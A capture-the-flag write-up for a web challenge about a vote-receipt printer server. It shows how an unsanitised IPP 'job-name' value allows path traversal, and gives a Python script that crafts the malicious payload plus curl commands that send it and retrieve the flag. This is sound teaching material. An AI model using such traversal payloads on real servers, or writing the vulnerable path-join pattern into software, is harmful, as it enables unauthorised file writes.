# Who checks the integrity of the integrity checks? - web

## Challenge

The government has ordered verification of the votes via the printed receipts. The results were... a mismatch in votes! While there were probably multiple ways that this came as a result, is it possible for someone to tamper with the receipts?

Provided zipped printer server codebase.

## Solve

Viewing the source code for the printer server, we can find both where our flag is and how to get there:

__*Where*__

```py
FLAG_PATH = "/flag.txt"
PRINTJOB_FOLDER = "/tmp/printjobs"
CHAL_TARGET_FOLDER = "/tmp/winners"
```

__*How*__

```py
@app.route('/printers/votes', methods=['POST'])
def handle_print_job():
    ...
    ...
    with open(f"{PRINTJOB_FOLDER}/{filename}", "wb") as f:
        f.write(pdf_data)
    
    actual_path = os.path.realpath(os.path.join(PRINTJOB_FOLDER, filename))

    if actual_path.startswith(CHAL_TARGET_FOLDER):
        with open(FLAG_PATH, "r") as f:
            flag = f.read()

        with open(actual_path, "w") as f:
            f.write(flag)

    return Response("Print job saved", status=200, content_type="application/ipp")
```

So:

- The print job folder is `/tmp/printjobs`
- The target folder is `/tmp/winners`
- If we provide a print job with a filename that evaluates to a path beginning with `/tmp/winners`, the flag will be written in that directory under whatever filename we provide
  - The use of an f-string directly inserts the provided input without escaping or sanitisation. This input is then passed to `os.path.join()` leading to a path traversal vulnerability

We can see both how we supply a filename and the expected structure of a print job earlier in `handle_print_job()`:

```py
data = request.data
    idx = 8
    if data[idx] != 0x01:
        return "Missing operation attributes tag", 400
    idx += 1

    filename = None
    try:
        while data[idx] != 0x03:
            tag = data[idx]
            name_len = struct.unpack(">H", data[idx+1:idx+3])[0]
            name = data[idx+3:idx+3+name_len].decode()
            val_len_offset = idx+3+name_len
            val_len = struct.unpack(">H", data[val_len_offset:val_len_offset+2])[0]
            val = data[val_len_offset+2:val_len_offset+2+val_len].decode()
            if name == "job-name":
                filename = val
            idx = val_len_offset + 2 + val_len
    except Exception:
        return "Malformed IPP attributes", 400

    idx += 1  # skip end tag
    pdf_data = data[idx:]
```
- First 8 bytes of the file are skipped (these are ipp headers version, operation code, request ID)
- Then expects byte `0x1` (ipp operation attributes tag which marks the start of job attributes)
- Then attributes are continuously read until encountering terminate byte `0x3`
- Then any remaining bytes are considered the payload or actual data of the print job

If the attribute `job-name` is provided, `filename` is set to its value (`val`). So, we can send a print job, specifying the `job-name` attribute to control filename! If we make `job-name` our target path, the unsanitised input can give us our flag!

The following script generates a print job matching the requirements with the `job-name` attribute set to `../winners/gimmeflag.txt`:

```py
import struct

def craft_ipp_payload(job_name, pdf_content=b"anything"):

    payload = bytearray()
    
    # IPP Header (8 bytes) - ignored by server so set to all zero
    # version: any
    payload.extend(struct.pack(">H", 0x0000))
    # operation: any
    payload.extend(struct.pack(">H", 0x0000))
    # req id: any
    payload.extend(struct.pack(">I", 0x00000000))
    
    # add operation attributes tag
    payload.append(0x01)
    
    # Add job-name attribute
    # Tag for textWithoutLanguage (0x41)
    payload.append(0x41)
    
    # Name length and name
    name = b"job-name"
    payload.extend(struct.pack(">H", len(name)))
    payload.extend(name)
    
    # Value length and value
    job_name_bytes = job_name.encode()
    payload.extend(struct.pack(">H", len(job_name_bytes)))
    payload.extend(job_name_bytes)
    
    # End of attributes tag
    payload.append(0x03)
    
    # add 'data' or 'payload' portion
    payload.extend(pdf_content)
    
    return bytes(payload)

malicious_payload = craft_ipp_payload("../winners/gimmeflag.txt")

with open("test.ipp", "wb") as f:
        f.write(malicious_payload)
```

This results in `filename` becoming `/tmp/printjobs/../winners/gimmeflag.txt`, evaluating to `/tmp/winners/gimmeflag.txt` (matching the syntax of our target directory)!

Running the script generates `test.ipp` which we send to the server:

```py
curl -X POST --data-binary @test.ipp -H "Content-Type: application/ipp" http://printer.commission.freedonia.vote:80/printers/votes -v
```

The server receives our file, which we can then read with:

`curl http://printer.commission.freedonia.vote:80/files/gimmeflag.txt`

print

`cysea{cant_trust_anything_these_days_31fe6ba0a0}`

